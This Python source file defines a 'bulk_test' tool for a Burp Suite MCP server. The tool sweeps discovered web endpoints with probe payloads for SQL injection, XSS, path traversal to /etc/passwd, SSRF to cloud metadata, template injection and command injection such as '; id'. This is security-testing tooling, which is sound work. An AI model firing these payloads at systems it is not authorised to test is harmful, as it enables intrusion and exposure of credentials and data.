"""bulk_test — sweep one vulnerability class across many endpoints."""

import asyncio

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def bulk_test(  # cost: expensive
        session: str,
        vulnerability: str,
        targets: list[dict] | None = None,
        max_endpoints: int = 10,
    ) -> str:
        """Test multiple endpoints for a specific vulnerability type in ONE call.

        Args:
            session: Session name
            vulnerability: Type: sqli, xss, lfi, open_redirect, ssrf, ssti, command_injection
            targets: Endpoint list (auto-discovered if None)
            max_endpoints: Max endpoints to test
        """
        # Quick payload sets per vulnerability type. Indicators must be
        # specific enough to survive an "is this string also in the baseline"
        # check — generic words like "sql" / "type" / small numbers are
        # rejected since they false-positive on docs and UI templates.
        payload_sets = {
            "sqli": {
                # Tautology "1 OR 1=1" intentionally skipped — can mutate rows
                # on UPDATE/DELETE endpoints (Rule 8). Boolean OR 1=1 is still
                # demonstrable via the UNION/error-based probes below.
                "payloads": ["'", "\"", "1' AND SLEEP(3)--", "1 UNION SELECT NULL--"],
                "indicators": ["you have an error in your sql syntax", "ora-00933",
                               "ora-01756", "syntax error at or near",
                               "unclosed quotation mark", "mysql_fetch",
                               "sqlite_error", "pg_query"],
            },
            "xss": {
                "payloads": ["<script>alert(1)</script>", "\" onmouseover=alert(1)", "<img src=x onerror=alert(1)>", "'-alert(1)-'"],
                "indicators": [],
            },
            "lfi": {
                "payloads": ["../../../etc/passwd", "....//....//....//etc/passwd",
                             "..%252f..%252f..%252fetc/passwd", "/etc/passwd"],
                "indicators": ["root:x:0:0:", "root:!:0:0:", "root:*:0:0:",
                               "daemon:x:1:", "nobody:x:"],
            },
            "open_redirect": {
                "payloads": [],
                "indicators": [],
                "uses_collaborator": True,
            },
            "ssrf": {
                "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "http://[::1]/"],
                "indicators": ["ami-id", "instance-id", "iam/security-credentials",
                               "SSH-2.0-", "SSH-1.99-"],
            },
            "ssti": {
                # 7777*7777 = 60481729 — unique enough to dodge the "49"
                # false-positive against any product price or pagination.
                "payloads": ["{{7777*7777}}", "${7777*7777}", "<%= 7777*7777 %>", "#{7777*7777}"],
                "indicators": ["60481729"],
            },
            "command_injection": {
                "payloads": ["; id", "| id", "$(id)", "`id`"],
                "indicators": ["uid=", "gid=", "groups="],
            },
        }

        if vulnerability not in payload_sets:
            return f"Error: Unknown vulnerability '{vulnerability}'. Options: {', '.join(payload_sets.keys())}"

        vconfig = payload_sets[vulnerability]

        collab_host = ""
        if vconfig.get("uses_collaborator"):
            collab = await client.post("/api/collaborator/payload")
            if "error" in collab:
                return f"Error: open_redirect requires Burp Collaborator: {collab['error']}"
            collab_url = collab.get("payload", "")
            collab_host = collab_url.replace("http://", "").replace("https://", "").split("/")[0]
            if not collab_host:
                return "Error: Could not get Collaborator host."
            vconfig["payloads"] = [
                f"https://{collab_host}",
                f"//{collab_host}",
                f"\\/\\/{collab_host}",
                f"//{collab_host}%2F%2F",
            ]

        if not targets:
            ep_data = await client.get("/api/analysis/unique-endpoints", params={"limit": str(max_endpoints * 3)})
            if "error" in ep_data:
                return f"Error: {ep_data['error']}"
            auto_targets = []
            for ep in ep_data.get("endpoints", []):
                params = ep.get("parameters", [])
                if params:
                    endpoint = ep.get("endpoint", "")
                    parts = endpoint.split(" ", 1)
                    ep_method = parts[0] if len(parts) > 1 else "GET"
                    ep_path = parts[1] if len(parts) > 1 else parts[0]
                    for p in params:
                        auto_targets.append({"method": ep_method, "path": ep_path, "parameter": p})
            targets = auto_targets[:max_endpoints]

        if not targets:
            return "No targets found. Browse the target first or provide targets manually."

        tested_targets = targets
        lines = [f"BULK TEST: {vulnerability} across {len(tested_targets)} targets\n"]
        findings: list[dict] = []
        total_requests = 0

        for t in tested_targets:
            t_method = t.get("method", "GET")
            t_path = t.get("path", "/")
            t_param = t.get("parameter", "")
            if not t_param:
                continue

            baseline_resp = await client.post("/api/session/request", json={
                "session": session, "method": t_method, "path": t_path,
            })
            if "error" in baseline_resp:
                continue
            baseline_status = baseline_resp.get("status", 0)
            baseline_length = baseline_resp.get("response_length", 0)
            baseline_time_ms = baseline_resp.get("time_ms", 0)
            baseline_body = baseline_resp.get("response_body", "")

            for payload in vconfig["payloads"]:
                total_requests += 1
                sep = "&" if "?" in t_path else "?"
                inject_path = f"{t_path}{sep}{t_param}={payload}"

                resp = await client.post("/api/session/request", json={
                    "session": session, "method": t_method, "path": inject_path,
                })
                if "error" in resp:
                    continue

                status = resp.get("status", 0)
                length = resp.get("response_length", 0)
                body = resp.get("response_body", "")
                time_ms = resp.get("time_ms", 0)

                finding_reasons: list[str] = []

                for ind in vconfig["indicators"]:
                    if ind.lower() in body.lower() and ind.lower() not in baseline_body.lower():
                        finding_reasons.append(f"indicator: {ind}")

                if vulnerability == "xss" and payload in body:
                    finding_reasons.append("reflected in response")

                if vulnerability == "open_redirect" and collab_host:
                    for h in resp.get("response_headers", []):
                        if h["name"].lower() == "location" and collab_host in h["value"]:
                            finding_reasons.append(f"redirect to Collaborator: {h['value'][:50]}")

                # Multi-DBMS sleep-style timing detector (Rule 11). Threshold
                # 1.5s under baseline+2.5s so SLEEP(3) actually exceeds it
                # under typical jitter.
                timing_threshold = max(2500, baseline_time_ms + 1500)
                p_upper = payload.upper()
                is_timing_payload = (
                    "SLEEP(" in p_upper
                    or "PG_SLEEP" in p_upper
                    or "WAITFOR DELAY" in p_upper
                    or "BENCHMARK(" in p_upper
                    or "DBMS_PIPE.RECEIVE_MESSAGE" in p_upper
                    or "DBMS_LOCK.SLEEP" in p_upper
                )
                if time_ms > timing_threshold and is_timing_payload:
                    confirmed = 1
                    for _ in range(2):
                        verify_resp = await client.post("/api/session/request", json={
                            "session": session, "method": t_method, "path": inject_path,
                        })
                        if "error" in verify_resp:
                            break
                        total_requests += 1
                        if verify_resp.get("time_ms", 0) > timing_threshold:
                            confirmed += 1
                    if confirmed >= 3:
                        finding_reasons.append(f"timing: {time_ms}ms vs baseline {baseline_time_ms}ms (3/3 iterations)")

                if status == 500 and baseline_status != 500:
                    verify_resp = await client.post("/api/session/request", json={
                        "session": session, "method": t_method, "path": inject_path,
                    })
                    total_requests += 1
                    if "error" not in verify_resp and verify_resp.get("status", 0) == 500:
                        finding_reasons.append("500 error (consistent, possible injection)")

                if finding_reasons:
                    severity = "HIGH" if any("indicator" in r or "timing" in r for r in finding_reasons) else "MEDIUM"
                    findings.append({
                        "severity": severity,
                        "endpoint": f"{t_method} {t_path}",
                        "parameter": t_param,
                        "payload": payload,
                        "reasons": finding_reasons,
                    })

        if findings:
            lines.append(f"FINDINGS ({len(findings)}):")
            for f in findings:
                reasons_str = ", ".join(f["reasons"])
                lines.append(f"  [{f['severity']}] {f['endpoint']}?{f['parameter']}=")
                lines.append(f"    Payload: {f['payload']}")
                lines.append(f"    Evidence: {reasons_str}")
                lines.append("")
        else:
            lines.append("No findings.")

        if vulnerability == "open_redirect" and collab_host:
            await asyncio.sleep(5)
            interactions_data = await client.get("/api/collaborator/interactions")
            interactions = interactions_data.get("interactions", []) if "error" not in interactions_data else []
            if interactions:
                lines.append(f"\nCOLLABORATOR CONFIRMED: {len(interactions)} interaction(s) detected")
                for hit in interactions[:5]:
                    lines.append(f"  [{hit.get('type', '?')}] from {hit.get('client_ip', '?')}")
                lines.append("  Open redirect CONFIRMED — server followed redirect to Collaborator.")
            elif findings:
                lines.append("\nNo Collaborator interactions (Location header showed redirect but server may not follow).")

        # "Clean" = endpoint/param pairs that produced ZERO findings.
        vulnerable_keys = {f"{f['endpoint']}?{f['parameter']}" for f in findings}
        tested_keys = {f"{t.get('method','GET')} {t.get('path','/')}?{t.get('parameter','')}" for t in tested_targets}
        clean = len(tested_keys - vulnerable_keys)
        lines.append(f"CLEAN: {clean} endpoint/param pairs showed no anomalies")
        lines.append(f"TESTED: {len(tested_targets)} targets, {total_requests} requests total")

        return "\n".join(lines)
